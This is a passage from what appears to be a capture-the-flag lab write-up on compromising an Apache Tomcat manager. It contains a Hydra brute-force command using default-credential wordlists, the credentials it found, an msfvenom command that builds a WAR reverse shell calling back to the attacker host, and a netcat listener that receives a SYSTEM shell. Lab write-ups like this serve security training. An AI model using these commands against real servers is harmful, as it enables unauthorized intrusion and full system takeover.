Step 2: Service Brute-Forcing

To check for weak or default admin credentials on the Tomcat web app manager, Hydra was used against /manager/status using Metasploit's default Tomcat user and password wordlists

hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
      http-get://10.129.6.253:8080/manager/status

2 sets of valid credientials were found:
admin: admin
tomcat: s3cret

Step 3: Weaponization and Foothold

Payload Generation: A java reverse TCP payload in WAR format was generated using msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.209 LPORT=4444 -f war > shell.war

Deployment: Went to http://10.129.6.253:8080/manager and authenticated with the credentials obtained, and uploaded shell.war via the WAR file to deploy section

Listener Setup: A netcat listener was opened to receive the incoming connection:
nc -lvnp 4444

Execution: Triggered the payload by browing to /shell. The reverse connection landed on the listener with highest level privileges
The command used was whoami and the response was nt authority\system

